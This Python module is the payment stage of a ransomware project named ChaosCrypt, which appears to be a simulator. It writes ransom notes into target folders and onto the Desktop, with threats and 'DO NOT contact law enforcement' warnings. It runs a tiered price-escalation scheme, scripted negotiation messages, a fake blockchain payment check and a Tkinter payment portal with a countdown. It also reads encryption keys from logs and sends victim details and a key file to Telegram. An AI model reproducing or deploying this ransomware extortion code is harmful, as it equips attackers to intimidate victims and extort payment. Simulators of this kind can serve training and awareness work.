import os
import sys
import time
import json
import random
import string
import hashlib
import shutil
import argparse
import datetime
import unicodedata

current_dir = os.path.dirname(os.path.abspath(__file__))
parent_dir = os.path.dirname(current_dir)
if parent_dir not in sys.path:
    sys.path.append(parent_dir)

from chaoscrypt.settings import (
    ROOT_DIR, LOG_DIR, ASSETS_DIR, LOGFILES,
    SHOW_TARGET_DIR, STEALTH_TARGET_DIR,
    RANSOM_NOTE_NAME, RANSOM_QR_NAME,
    ENCRYPTED_SUFFIX, METADATA_SUFFIX,
    IMG_LOGO_SYSTEM, IMG_ICO_NAME
)
from chaoscrypt.logbook import LogBook

try:
    from chaoscrypt.telegram_notify import send_message, send_photo, send_document
except ImportError:
    send_message = None
    send_photo = None
    send_document = None

PAYMENT_PHASE = "payment"
PAYMENT_LOG_PATH = os.path.join(LOG_DIR, "payment_flow.json")
RECEIPT_PATH = os.path.join(LOG_DIR, "payment_receipt.txt")
KEY_DELIVERY_PATH = os.path.join(LOG_DIR, "delivered_keys.json")

RANSOM_AMOUNTS = {
    "initial": {"btc": 0.5, "usd": 21500},
    "escalated_1": {"btc": 0.75, "usd": 32250},
    "escalated_2": {"btc": 1.5, "usd": 64500},
    "final": {"btc": 3.0, "usd": 129000},
}

CRYPTO_CURRENCIES = {
    "BTC": {"name": "Bitcoin", "prefix": "bc1q", "length": 42, "icon": "₿"},
    "ETH": {"name": "Ethereum", "prefix": "0x", "length": 42, "icon": "Ξ"},
    "XMR": {"name": "Monero", "prefix": "4", "length": 95, "icon": "ɱ"},
}

HACKER_MESSAGES = [
    "We have your files. Pay now or lose everything.",
    "Time is running out. Your data will be published.",
    "We are professionals. Pay and get your files back. Simple.",
    "Don't try to recover without us. You will destroy your data.",
    "This is automated. No one can help you except us.",
    "Every hour the price goes up. Decide wisely.",
    "We already exfiltrated your data. Payment prevents publication.",
    "Your IT department cannot help. We encrypted the backups too.",
]

VICTIM_MESSAGES = [
    "Please, I need my files back...",
    "Can you lower the price?",
    "How do I know you'll give me the key?",
    "I'm transferring the funds now...",
    "Please don't publish my data.",
    "I sent the payment, check the wallet.",
    "Can I get a discount?",
    "I need more time...",
]


def _display_width(text):
    width = 0
    i = 0
    chars = list(text)
    while i < len(chars):
        ch = chars[i]
        if ch in ('\ufe0e', '\ufe0f'):
            i += 1
            continue
        cp = ord(ch)
        cat = unicodedata.category(ch)
        ea = unicodedata.east_asian_width(ch)
        if ea in ('F', 'W'):
            width += 2
        elif cp >= 0x1F000:
            width += 2
        elif cp >= 0x2600 and cp <= 0x27BF:
            width += 2
        elif cp >= 0x2300 and cp <= 0x23FF:
            width += 2
        elif cp >= 0x2700 and cp <= 0x27BF:
            width += 2
        elif cp >= 0xFE00 and cp <= 0xFE0F:
            pass
        elif cat == 'Mn' or cat == 'Me' or cat == 'Cf':
            pass
        else:
            width += 1
        i += 1
    return width


class WalletGenerator:
    @staticmethod
    def generate_btc():
        chars = string.ascii_lowercase + string.digits
        suffix = ''.join(random.choices(chars, k=38))
        return f"bc1q{suffix}"

    @staticmethod
    def generate_eth():
        chars = string.hexdigits[:16]
        suffix = ''.join(random.choices(chars, k=40))
        return f"0x{suffix}"

    @staticmethod
    def generate_xmr():
        chars = string.digits + string.ascii_letters
        suffix = ''.join(random.choices(chars, k=94))
        return f"4{suffix}"

    @staticmethod
    def generate_all():
        return {
            "BTC": WalletGenerator.generate_btc(),
            "ETH": WalletGenerator.generate_eth(),
            "XMR": WalletGenerator.generate_xmr(),
        }

    @staticmethod
    def generate_transaction_id():
        return hashlib.sha256(
            f"{time.time()}-{random.random()}".encode()
        ).hexdigest()[:64]


class PaymentFlow:
    def __init__(self):
        self.logger = LogBook(phase=PAYMENT_PHASE)
        self.session_id = hashlib.md5(
            f"{os.getpid()}-{time.time()}".encode()
        ).hexdigest()[:12]
        self.wallets = WalletGenerator.generate_all()
        self.current_tier = "initial"
        self.payment_confirmed = False
        self.delivered_keys = {}
        self.negotiation_log = []
        self.victim_id = f"VICTIM-{self.session_id[:6].upper()}"

        print(f"[PAYMENT] Flow initialized. Session: {self.session_id}")
        self.logger.log_event("info", "Payment flow initialized", metadata={
            "session_id": self.session_id,
            "victim_id": self.victim_id,
            "wallets": self.wallets,
            "initial_ransom": RANSOM_AMOUNTS["initial"]
        })

    @staticmethod
    def _box_line(text="", width=60):
        if not text:
            return "║ " + " " * width + " ║"
        content = text
        dw = _display_width(content)
        pad = width - dw
        if pad < 0:
            pad = 0
        return "║ " + content + " " * pad + " ║"

    @staticmethod
    def _box_center(text, width=60):
        dw = _display_width(text)
        total_pad = width - dw
        if total_pad < 0:
            total_pad = 0
        left = total_pad // 2
        right = total_pad - left
        return "║ " + " " * left + text + " " * right + " ║"

    @staticmethod
    def _box_top(width=60):
        return "╔═" + "═" * width + "═╗"

    @staticmethod
    def _box_bot(width=60):
        return "╚═" + "═" * width + "═╝"

    @staticmethod
    def _box_sep(width=60):
        return "╠═" + "═" * width + "═╣"

    @staticmethod
    def _box_empty(width=60):
        return "║ " + " " * width + " ║"

    def collect_encryption_keys(self):
        print("[PAYMENT] ─── Collecting Encryption Keys ───")
        keys = {}

        for phase_name in ('show', 'stealth'):
            log_path = LOGFILES.get(phase_name)
            if not log_path or not os.path.exists(log_path):
                continue
            try:
                with open(log_path, 'r', encoding='utf-8') as f:
                    for line in f:
                        line = line.strip()
                        if not line:
                            continue
                        try:
                            ev = json.loads(line)
                            meta = ev.get('metadata') or {}
                            key = meta.get('key') or meta.get('encryption_key')
                            if key and phase_name not in keys:
                                keys[phase_name] = {
                                    "key": key,
                                    "file": meta.get('file', meta.get('path', 'unknown')),
                                    "ts": ev.get('ts', ''),
                                    "algorithm": meta.get('algorithm', 'XOR/AES')
                                }
                        except json.JSONDecodeError:
                            continue
            except Exception as e:
                print(f"[PAYMENT] Error reading {log_path}: {e}")

        for phase_name, target_dir in [('show', SHOW_TARGET_DIR), ('stealth', STEALTH_TARGET_DIR)]:
            if phase_name in keys and os.path.isdir(target_dir):
                encrypted = sum(1 for f in os.listdir(target_dir) if f.endswith(ENCRYPTED_SUFFIX))
                keys[phase_name]["encrypted_files"] = encrypted

        self.delivered_keys = keys
        print(f"[PAYMENT] Found keys for: {list(keys.keys())}")

        self.logger.log_event("exfiltration", "Encryption keys collected", metadata={
            "phases": list(keys.keys()),
            "total_keys": len(keys)
        })

        return keys

    def generate_ransom_note(self):
        print("[PAYMENT] ─── Generating Ransom Note ───")
        amount = RANSOM_AMOUNTS[self.current_tier]
        W = 60
        L = self._box_line
        C = self._box_center
        T = self._box_top(W)
        B = self._box_bot(W)
        S = self._box_sep(W)
        E = self._box_empty(W)

        btc_str = f"{amount['btc']} BTC (= ${amount['usd']:,})"

        lines = [
            T,
            C("💀 CHAOSCRYPT RANSOMWARE 💀", W),
            S,
            E,
            L("Your network has been compromised.", W),
            L("All files have been encrypted with AES-256 + XOR.", W),
            E,
            L(f"Victim ID: {self.victim_id}", W),
            L(f"Session:   {self.session_id}", W),
            E,
            S,
            C("PAYMENT DETAILS", W),
            S,
            E,
            L(f"Amount: {btc_str}", W),
            E,
            L("₿ Bitcoin:", W),
            L(f"  {self.wallets['BTC']}", W),
            E,
            L("Ξ Ethereum:", W),
            L(f"  {self.wallets['ETH']}", W),
            E,
            L("ɱ Monero:", W),
            L(f"  {self.wallets['XMR'][:54]}", W),
            E,
            S,
            C("⚠️  WARNING", W),
            S,
            E,
            L("* You have 48 hours to pay", W),
            L("* After 24h the price DOUBLES", W),
            L("* After 48h all keys are DESTROYED", W),
            L("* DO NOT contact law enforcement", W),
            L("* DO NOT attempt manual decryption", W),
            L("* DO NOT rename encrypted files", W),
            E,
            L("After payment, your decryption key will be", W),
            L("delivered automatically via this portal.", W),
            E,
            S,
            L("Contact: Telegram @chaoscrypt_support", W),
            L("Proof:   We can decrypt 1 file for free", W),
            B,
        ]

        note = "\n".join(lines) + "\n"

        for target_dir in [SHOW_TARGET_DIR, STEALTH_TARGET_DIR]:
            if os.path.isdir(target_dir):
                try:
                    with open(os.path.join(target_dir, RANSOM_NOTE_NAME), 'w', encoding='utf-8') as f:
                        f.write(note)
                except Exception:
                    pass

        desktop = os.path.join(os.path.expanduser("~"), "Desktop")
        if os.path.isdir(desktop):
            try:
                with open(os.path.join(desktop, RANSOM_NOTE_NAME), 'w', encoding='utf-8') as f:
                    f.write(note)
            except Exception:
                pass

        self.logger.log_event("chaos", "Ransom note generated", metadata={
            "tier": self.current_tier,
            "amount_btc": amount["btc"],
            "amount_usd": amount["usd"],
            "victim_id": self.victim_id
        })

        if send_message:
            send_message(
                f"💰 <b>Ransom Note Deployed</b>\n"
                f"<code>Victim: {self.victim_id}</code>\n"
                f"<code>Amount: {amount['btc']} BTC (${amount['usd']:,})</code>\n"
                f"<code>Tier:   {self.current_tier}</code>\n"
                f"<code>BTC:    {self.wallets['BTC'][:30]}...</code>",
                parse_mode="HTML", async_mode=False
            )

        print(note)
        return note

    def escalate_price(self):
        tiers = list(RANSOM_AMOUNTS.keys())
        current_idx = tiers.index(self.current_tier)
        if current_idx < len(tiers) - 1:
            old_tier = self.current_tier
            self.current_tier = tiers[current_idx + 1]
            old_amount = RANSOM_AMOUNTS[old_tier]
            new_amount = RANSOM_AMOUNTS[self.current_tier]

            print(f"[PAYMENT] 📈 Price escalated: {old_amount['btc']} -> {new_amount['btc']} BTC")

            self.logger.log_event("chaos", "Ransom price escalated", metadata={
                "old_tier": old_tier, "new_tier": self.current_tier,
                "old_btc": old_amount["btc"], "new_btc": new_amount["btc"]
            })

            if send_message:
                send_message(
                    f"📈 <b>Price Escalated!</b>\n"
                    f"<code>{old_amount['btc']} BTC -> {new_amount['btc']} BTC</code>\n"
                    f"<code>Victim: {self.victim_id}</code>",
                    parse_mode="HTML", async_mode=False
                )
        else:
            print("[PAYMENT] Already at maximum price tier.")

    def verify_payment_console(self):
        print("[PAYMENT] ─── Payment Verification ───")
        tx_id = WalletGenerator.generate_transaction_id()

        self.logger.log_event("payment", "Payment verification started", metadata={
            "transaction_id": tx_id,
            "wallet": self.wallets["BTC"][:20] + "...",
            "amount": RANSOM_AMOUNTS[self.current_tier]["btc"]
        })

        print(f"\n  🔍 Scanning blockchain for incoming transaction...")
        print(f"  📋 TX: {tx_id[:32]}...")
        print(f"  💳 Wallet: {self.wallets['BTC'][:30]}...")
        print()

        stages = [
            ("Connecting to blockchain nodes", 2.0),
            ("Scanning mempool", 1.5),
            ("Transaction found in mempool", 1.0),
            ("Waiting for confirmation 1/3", 2.0),
            ("Waiting for confirmation 2/3", 2.0),
            ("Waiting for confirmation 3/3", 2.0),
            ("Verifying transaction amount", 1.0),
            ("Checking wallet balance", 1.0),
            ("Validating payment signature", 1.5),
            ("Payment confirmed", 0.5),
        ]

        for i, (stage, delay) in enumerate(stages):
            pct = int((i + 1) / len(stages) * 100)
            bar_len = 30
            filled = int(bar_len * (i + 1) / len(stages))
            bar = "█" * filled + "░" * (bar_len - filled)
            sys.stdout.write(f"\r  [{bar}] {pct:3d}% | {stage}...")
            sys.stdout.flush()
            time.sleep(delay)

        print(f"\n\n  ✅ PAYMENT CONFIRMED")
        print(f"  💰 Amount: {RANSOM_AMOUNTS[self.current_tier]['btc']} BTC")
        print(f"  📋 TX: {tx_id}")
        print(f"  ⏰ Confirmations: 3/3")
        print()

        self.payment_confirmed = True

        self.logger.log_event("payment", "Payment confirmed", metadata={
            "transaction_id": tx_id,
            "amount_btc": RANSOM_AMOUNTS[self.current_tier]["btc"],
            "confirmations": 3,
            "victim_id": self.victim_id
        }, tag="critical")

        if send_message:
            send_message(
                f"💰 <b>PAYMENT RECEIVED!</b>\n"
                f"<code>TX:     {tx_id[:32]}...</code>\n"
                f"<code>Amount: {RANSOM_AMOUNTS[self.current_tier]['btc']} BTC</code>\n"
                f"<code>Victim: {self.victim_id}</code>\n"
                f"<code>Status: 3/3 confirmations</code>",
                parse_mode="HTML", async_mode=False
            )

        return tx_id

    def deliver_keys(self):
        print("[PAYMENT] ─── Key Delivery ───")

        if not self.payment_confirmed:
            print("[PAYMENT] ❌ Payment not confirmed! No keys delivered.")
            return None

        if not self.delivered_keys:
            self.collect_encryption_keys()

        if not self.delivered_keys:
            print("[PAYMENT] ❌ No encryption keys found in logs!")
            return None

        delivery = {
            "victim_id": self.victim_id,
            "session_id": self.session_id,
            "delivered_at": datetime.datetime.now(datetime.timezone.utc).isoformat(),
            "payment_tier": self.current_tier,
            "amount_btc": RANSOM_AMOUNTS[self.current_tier]["btc"],
            "keys": {}
        }

        W = 55
        print(f"\n  🔓 DECRYPTION KEYS — Victim {self.victim_id}")
        print(f"  {'=' * W}")

        for phase_name, key_info in self.delivered_keys.items():
            key_val = key_info["key"]
            enc_count = key_info.get("encrypted_files", "?")
            delivery["keys"][phase_name] = {
                "key": key_val,
                "algorithm": key_info.get("algorithm", "XOR/AES"),
                "encrypted_files": enc_count
            }
            print(f"\n  📁 {phase_name.upper()} Phase:")
            print(f"     🔑 Key:       {key_val}")
            print(f"     🔒 Files:     {enc_count}")
            print(f"     ⚙️  Algorithm: {key_info.get('algorithm', 'XOR/AES')}")

        print(f"\n  {'=' * W}")
        print(f"  ✅ Use these keys with decryptor_gui.py to restore files.")
        print()

        os.makedirs(LOG_DIR, exist_ok=True)
        with open(KEY_DELIVERY_PATH, 'w', encoding='utf-8') as f:
            json.dump(delivery, f, ensure_ascii=False, indent=2)

        self.logger.log_event("payment", "Keys delivered to victim", metadata={
            "victim_id": self.victim_id,
            "phases": list(delivery["keys"].keys()),
            "keys_count": len(delivery["keys"]),
            "delivery_path": KEY_DELIVERY_PATH
        }, tag="critical")

        if send_message:
            keys_text = "\n".join(
                f"  🔑 <code>{ph}: {ki['key'][:40]}...</code>"
                for ph, ki in self.delivered_keys.items()
            )
            send_message(
                f"🔓 <b>KEYS DELIVERED</b>\n"
                f"<code>Victim: {self.victim_id}</code>\n"
                f"<code>Phases: {', '.join(delivery['keys'].keys())}</code>\n\n"
                f"{keys_text}",
                parse_mode="HTML", async_mode=False
            )

        if send_document and os.path.isfile(KEY_DELIVERY_PATH):
            send_document(KEY_DELIVERY_PATH,
                          caption=f"🔓 Keys delivered to {self.victim_id}",
                          async_mode=False)

        return delivery

    def generate_receipt(self, tx_id):
        print("[PAYMENT] ─── Generating Receipt ───")
        amount = RANSOM_AMOUNTS[self.current_tier]
        ts = datetime.datetime.now(datetime.timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
        W = 60
        L = self._box_line
        C = self._box_center
        T = self._box_top(W)
        B = self._box_bot(W)
        S = self._box_sep(W)
        E = self._box_empty(W)

        amt_str = f"{amount['btc']} BTC (${amount['usd']:,})"

        lines = [
            T,
            C("💰 PAYMENT RECEIPT 💰", W),
            S,
            E,
            L(f"Victim ID:      {self.victim_id}", W),
            L(f"Session:        {self.session_id}", W),
            L(f"Date:           {ts}", W),
            E,
            L(f"Amount Paid:    {amt_str}", W),
            L(f"Currency:       Bitcoin (BTC)", W),
            L(f"Transaction:    {tx_id[:36]}", W),
            E,
            L(f"Wallet:         {self.wallets['BTC'][:36]}", W),
            E,
            L("Status:         ✅ CONFIRMED (3/3 blocks)", W),
            E,
            S,
            E,
            L("Decryption keys have been delivered.", W),
            L("Use decryptor_gui.py to restore your files.", W),
            E,
            L("Keys saved to:  logs/delivered_keys.json", W),
            E,
            B,
        ]

        receipt = "\n".join(lines) + "\n"

        with open(RECEIPT_PATH, 'w', encoding='utf-8') as f:
            f.write(receipt)

        desktop = os.path.join(os.path.expanduser("~"), "Desktop")
        if os.path.isdir(desktop):
            try:
                shutil.copy2(RECEIPT_PATH, os.path.join(desktop, "PAYMENT_RECEIPT.txt"))
            except Exception:
                pass

        self.logger.log_event("payment", "Receipt generated", metadata={
            "path": RECEIPT_PATH, "tx_id": tx_id[:32]
        })

        print(receipt)
        return RECEIPT_PATH

    def negotiation_chat_console(self, rounds=5):
        print("[PAYMENT] ─── Negotiation Chat ───")
        W = 50
        print()
        print(f"  {self._box_top(W)}")
        print(f"  {self._box_center('💀 ChaosCrypt Support Chat 💀', W)}")
        print(f"  {self._box_bot(W)}")
        print()

        self.logger.log_event("chaos", "Negotiation chat started", metadata={
            "rounds": rounds, "victim_id": self.victim_id
        })

        used_hacker = []
        used_victim = []

        for i in range(rounds):
            available_h = [m for m in HACKER_MESSAGES if m not in used_hacker]
            if not available_h:
                available_h = HACKER_MESSAGES
            h_msg = random.choice(available_h)
            used_hacker.append(h_msg)

            ts = datetime.datetime.now().strftime("%H:%M:%S")
            print(f"  [{ts}] 💀 Operator:")
            print(f"  > {h_msg}")
            print()
            time.sleep(1.5)

            available_v = [m for m in VICTIM_MESSAGES if m not in used_victim]
            if not available_v:
                available_v = VICTIM_MESSAGES
            v_msg = random.choice(available_v)
            used_victim.append(v_msg)

            ts = datetime.datetime.now().strftime("%H:%M:%S")
            print(f"  [{ts}] 👤 Victim ({self.victim_id}):")
            print(f"  > {v_msg}")
            print()

            self.negotiation_log.append({
                "round": i + 1,
                "hacker": h_msg,
                "victim": v_msg,
                "ts": datetime.datetime.now().isoformat()
            })

            time.sleep(1.5)

        amount = RANSOM_AMOUNTS[self.current_tier]
        ts = datetime.datetime.now().strftime("%H:%M:%S")
        final_msg = (f"Final offer: {amount['btc']} BTC. "
                     f"Send to {self.wallets['BTC'][:25]}... No more negotiations.")
        print(f"  [{ts}] 💀 Operator:")
        print(f"  > {final_msg}")
        print()
        print(f"  {'═' * 50}")
        print()

        self.logger.log_event("chaos", "Negotiation complete", metadata={
            "rounds": rounds,
            "final_amount": amount["btc"],
            "log_entries": len(self.negotiation_log)
        })

        if send_message:
            send_message(
                f"💬 <b>Negotiation Complete</b>\n"
                f"<code>Victim: {self.victim_id}</code>\n"
                f"<code>Rounds: {rounds}</code>\n"
                f"<code>Final:  {amount['btc']} BTC</code>",
                parse_mode="HTML", async_mode=False
            )

    def payment_portal_gui(self, duration=20):
        print("[PAYMENT] ─── Payment Portal GUI ───")
        try:
            import tkinter as tk
            from PIL import Image, ImageTk
        except ImportError:
            print("[PAYMENT] tkinter/Pillow missing. Falling back to console.")
            return

        self.logger.log_event("chaos", "Payment portal GUI opened", metadata={
            "duration": duration, "victim_id": self.victim_id
        })

        amount = RANSOM_AMOUNTS[self.current_tier]

        try:
            root = tk.Tk()
            root.title(f"ChaosCrypt Payment Portal - {self.victim_id}")
            root.configure(bg='#0d0d0d')
            root.geometry("700x750")
            root.resizable(False, False)
            root.attributes('-topmost', True)

            ico = os.path.join(ASSETS_DIR, IMG_ICO_NAME)
            if os.path.exists(ico):
                try:
                    root.iconbitmap(ico)
                except Exception:
                    pass

            logo_path = os.path.join(ASSETS_DIR, IMG_LOGO_SYSTEM)
            if os.path.exists(logo_path):
                try:
                    li = Image.open(logo_path).resize((60, 60), Image.LANCZOS)
                    lp = ImageTk.PhotoImage(li)
                    ll = tk.Label(root, image=lp, bg='#0d0d0d')
                    ll.image = lp
                    ll.pack(pady=(10, 0))
                except Exception:
                    pass

            tk.Label(root, text="CHAOSCRYPT PAYMENT PORTAL",
                     font=("Consolas", 16, "bold"), fg="#ff3333", bg="#0d0d0d").pack(pady=5)

            tk.Label(root, text=f"Victim ID: {self.victim_id}",
                     font=("Consolas", 10), fg="#888888", bg="#0d0d0d").pack()

            tk.Frame(root, bg="#333333", height=2).pack(fill="x", padx=20, pady=10)

            tk.Label(root, text=f"Amount Due: {amount['btc']} BTC (= ${amount['usd']:,})",
                     font=("Consolas", 14, "bold"), fg="#ff9900", bg="#0d0d0d").pack(pady=5)

            tk.Label(root, text="Send Bitcoin to:",
                     font=("Consolas", 10), fg="#aaaaaa", bg="#0d0d0d").pack()

            addr_frame = tk.Frame(root, bg="#1a1a1a", padx=10, pady=8)
            addr_frame.pack(padx=20, pady=5, fill="x")
            tk.Label(addr_frame, text=f"BTC: {self.wallets['BTC']}",
                     font=("Consolas", 9), fg="#00ff00", bg="#1a1a1a").pack()

            qr_path = os.path.join(LOG_DIR, RANSOM_QR_NAME)
            if not os.path.exists(qr_path) or os.path.getsize(qr_path) == 0:
                qr_path = os.path.join(ASSETS_DIR, "payment_qr.png")
            if os.path.exists(qr_path) and os.path.getsize(qr_path) > 0:
                try:
                    qi = Image.open(qr_path).resize((200, 200), Image.LANCZOS)
                    qp = ImageTk.PhotoImage(qi)
                    ql = tk.Label(root, image=qp, bg="#0d0d0d")
                    ql.image = qp
                    ql.pack(pady=10)
                except Exception:
                    pass

            alt_frame = tk.Frame(root, bg="#0d0d0d")
            alt_frame.pack(pady=5)
            tk.Label(alt_frame, text=f"ETH: {self.wallets['ETH'][:30]}...",
                     font=("Consolas", 8), fg="#666666", bg="#0d0d0d").pack()
            tk.Label(alt_frame, text=f"XMR: {self.wallets['XMR'][:30]}...",
                     font=("Consolas", 8), fg="#666666", bg="#0d0d0d").pack()

            tk.Frame(root, bg="#333333", height=2).pack(fill="x", padx=20, pady=10)

            timer_frame = tk.Frame(root, bg="#0d0d0d")
            timer_frame.pack(pady=5)
            tk.Label(timer_frame, text="Time remaining before key destruction:",
                     font=("Consolas", 10), fg="#ff6666", bg="#0d0d0d").pack()
            timer_var = tk.StringVar(value="47:59:59")
            tk.Label(timer_frame, textvariable=timer_var,
                     font=("Consolas", 28, "bold"), fg="#ff0000", bg="#0d0d0d").pack()

            tk.Label(root, text="Price doubles every 24 hours!",
                     font=("Consolas", 9), fg="#ff6600", bg="#0d0d0d").pack(pady=3)

            status_var = tk.StringVar(value="Awaiting payment...")
            tk.Label(root, textvariable=status_var,
                     font=("Consolas", 10), fg="#ffff00", bg="#0d0d0d").pack(pady=5)

            fake_secs = 47 * 3600 + 59 * 60 + 59

            def _tick(remaining, fake):
                if remaining <= 0:
                    status_var.set("Payment simulation complete")
                    root.after(2000, root.destroy)
                    return
                h, rm = divmod(fake, 3600)
                m, s = divmod(rm, 60)
                timer_var.set(f"{h:02d}:{m:02d}:{s:02d}")

                if remaining == duration - 5:
                    status_var.set("Scanning blockchain...")
                elif remaining == duration - 10:
                    status_var.set("Transaction detected in mempool...")
                elif remaining == duration - 14:
                    status_var.set("Waiting for confirmations...")
                elif remaining == duration - 17:
                    status_var.set("Payment confirmed! Delivering keys...")
                elif remaining <= 3:
                    status_var.set("Keys delivered. Check logs/delivered_keys.json")

                root.after(1000, _tick, remaining - 1, fake - 1)

            root.after(100, _tick, duration, fake_secs)

            root.update_idletasks()
            x = (root.winfo_screenwidth() // 2) - 350
            y = (root.winfo_screenheight() // 2) - 375
            root.geometry(f"+{x}+{y}")

            root.mainloop()
            print("[PAYMENT] Portal closed.")
        except Exception as e:
            print(f"[PAYMENT] Portal error: {e}")

    def countdown_display(self, seconds=10):
        print("[PAYMENT] ─── Destruction Countdown ───")
        print()
        print("  KEYS WILL BE DESTROYED IN:")
        print()

        for remaining in range(seconds, 0, -1):
            h, rm = divmod(remaining * 4320, 3600)
            m, s = divmod(rm, 60)
            bar_len = 30
            filled = int(bar_len * (seconds - remaining) / seconds)
            bar = "░" * filled + "█" * (bar_len - filled)
            if remaining < 4:
                icon = "[!!!]"
            elif remaining < 7:
                icon = "[!! ]"
            else:
                icon = "[   ]"
            sys.stdout.write(f"\r  {icon} [{bar}] {h:02d}:{m:02d}:{s:02d}  ")
            sys.stdout.flush()
            time.sleep(1)

        print(f"\r  [XXX] [{'░' * 30}] 00:00:00  ")
        print()
        print("  DEADLINE REACHED. Keys will be destroyed.")
        print()


    def run_full_pipeline(self):
        print("\n" + "=" * 60)
        print("*** ChaosCrypt Payment Flow — Full Pipeline ***")
        print("=" * 60)

        self.logger.log_event("info", "Payment flow full pipeline started", metadata={
            "session_id": self.session_id, "victim_id": self.victim_id
        })

        if send_message:
            send_message(
                f"💰 <b>Payment Flow: Pipeline Started</b>\n"
                f"<code>Victim: {self.victim_id}</code>\n"
                f"<code>Session: {self.session_id}</code>",
                parse_mode="HTML", async_mode=False
            )

        print()
        self.collect_encryption_keys()
        time.sleep(1)

        print()
        self.generate_ransom_note()
        time.sleep(1)

        print()
        self.countdown_display(seconds=8)
        time.sleep(1)

        print()
        self.escalate_price()
        time.sleep(1)

        print()
        self.negotiation_chat_console(rounds=4)
        time.sleep(1)

        print()
        self.payment_portal_gui(duration=18)
        time.sleep(1)

        print()
        tx_id = self.verify_payment_console()
        time.sleep(1)

        print()
        delivery = self.deliver_keys()
        time.sleep(1)

        print()
        if tx_id:
            self.generate_receipt(tx_id)
        time.sleep(1)

        self.logger.log_event("finish", "Payment flow complete", metadata={
            "session_id": self.session_id,
            "victim_id": self.victim_id,
            "payment_confirmed": self.payment_confirmed,
            "keys_delivered": len(self.delivered_keys)
        })

        if send_message:
            send_message(
                f"✅ <b>Payment Flow: Complete</b>\n"
                f"<code>Victim: {self.victim_id}</code>\n"
                f"<code>Paid:   {RANSOM_AMOUNTS[self.current_tier]['btc']} BTC</code>\n"
                f"<code>Keys:   {len(self.delivered_keys)} delivered</code>\n"
                f"<code>Status: Transaction confirmed</code>",
                parse_mode="HTML", async_mode=False
            )

        print("\n" + "=" * 60)
        print(f"[PAYMENT] Pipeline complete. Victim: {self.victim_id}")
        print(f"[PAYMENT] Keys: {KEY_DELIVERY_PATH}")
        print(f"[PAYMENT] Receipt: {RECEIPT_PATH}")
        print("=" * 60)
        self.logger.close()


def main():
    parser = argparse.ArgumentParser(description="ChaosCrypt Payment Flow")
    parser.add_argument('--note', action='store_true', help="Generate ransom note only")
    parser.add_argument('--portal', action='store_true', help="Payment portal GUI only")
    parser.add_argument('--verify', action='store_true', help="Verify payment only")
    parser.add_argument('--keys', action='store_true', help="Deliver keys only")
    parser.add_argument('--chat', action='store_true', help="Negotiation chat only")
    parser.add_argument('--escalate', action='store_true', help="Escalate price")
    parser.add_argument('--countdown', action='store_true', help="Countdown display")
    parser.add_argument('--receipt', action='store_true', help="Generate receipt")
    args = parser.parse_args()

    pf = PaymentFlow()

    if args.note:
        pf.generate_ransom_note()
    elif args.portal:
        pf.payment_portal_gui()
    elif args.verify:
        pf.verify_payment_console()
    elif args.keys:
        pf.collect_encryption_keys()
        pf.payment_confirmed = True
        pf.deliver_keys()
    elif args.chat:
        pf.negotiation_chat_console()
    elif args.escalate:
        pf.escalate_price()
        pf.generate_ransom_note()
    elif args.countdown:
        pf.countdown_display()
    elif args.receipt:
        pf.payment_confirmed = True
        tx = WalletGenerator.generate_transaction_id()
        pf.generate_receipt(tx)
    else:
        pf.run_full_pipeline()

if __name__ == "__main__":
    main()